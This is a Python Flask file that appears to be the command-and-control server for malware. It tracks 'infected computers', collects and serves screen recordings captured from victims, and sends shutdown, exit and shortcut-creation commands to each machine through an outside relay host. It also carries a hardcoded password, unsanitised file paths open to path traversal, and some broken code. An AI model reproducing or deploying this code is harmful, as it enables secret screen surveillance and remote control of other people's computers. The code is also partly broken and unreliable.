import os
import base64
import requests
from flask_cors import CORS
from werkzeug.utils import secure_filename
from flask import Flask, send_file, request, redirect, url_for, jsonify
 
app = Flask(__name__)
CORS(app, supports_credentials=True)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_DIR = os.path.join(BASE_DIR, 'screen_recordings')

messages = []
temp_message = []
screen_recordings = []
infected_computers = []

for computer in infected_computers:
    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'updatewbcl-{computer}'})

@app.route('/', methods=['GET', 'POST'])
def home():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'create_shortcut-{computer}'})
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'nexus':
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    return send_file('templates/index.html')

@app.route('/success')
def success():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'exit-{computer}'})
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'shutdown-{computer}'})
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'exit-{computer}'})
    return send_file('templates/failure.html')

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

@app.route('/messages', methods=['POST', 'GET'])
def handle_messages():
    if request.method == 'POST':

        if 'video' in request.files and 'filename' in request.form:
            video = request.files['video']
            filename = request.form['filename']

            filepath = os.path.join(SAVE_DIR, filename)
            video.save(filepath)

            screen_recordings.append(filename)

            requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'screen-recording-ready'})
            print("Saved:", filepath)
            return jsonify({'status': 'saved', 'filename': filename})
                
        message = request.get_json()
        action = message.get('action', '')
        messages.append(message)

        if message.get('computer_name'):
            if message.get('computer_name').upper() not in infected_computers:
                infected_computers.append(message.get('computer_name').upper())
                print('New Computer: ', message.get('computer_name').upper())
        elif message.get('all_computers'):
            print('Computers Requested, returning: ', infected_computers)
            return infected_computers
        elif action.startswith('collect-recorded-'):
            computer = action.replace('collect-recorded-', '')
            print("Computer:", computer)
            requested_time = message.get('time', '')
            print("Requested time:", requested_time)

            if not requested_time:
                return jsonify({'error': 'Missing time for requested recording'}), 400

            filename = f"screen-recording-{computer}-{requested_time}.mp4"
            filepath = os.path.join(SAVE_DIR, filename)
            print("Looking for file:", filepath)

            if not os.path.exists(filepath):
                return jsonify({'error': 'Recording not found'}), 404

            return send_file(filepath, mimetype='video/mp4', as_attachment=False)
 
        print('Stored message: ', message)
        return 200
    else:
        if messages.json() != []:
            print('Sent message: ', messages)
        return messages

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8004, debug=True)